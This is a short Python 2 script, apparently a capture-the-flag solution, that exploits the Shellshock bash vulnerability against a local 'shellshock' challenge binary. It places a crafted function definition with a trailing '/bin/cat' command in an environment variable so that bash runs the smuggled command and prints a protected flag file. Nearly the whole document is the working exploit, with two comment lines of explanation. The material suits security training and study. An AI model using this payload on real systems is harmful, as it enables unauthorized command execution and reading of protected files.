# Shellshock vulnerability.
# The bash reads functions from env-variables and checks for functions (), then it still executes the code after
import sys, os, subprocess

env = os.environ
env['test'] = '() { echo hey; }\n  /bin/cat /home/shellshock/flag;'

p = subprocess.Popen(['/home/shellshock/shellshock'], env=env)
print p.communicate()
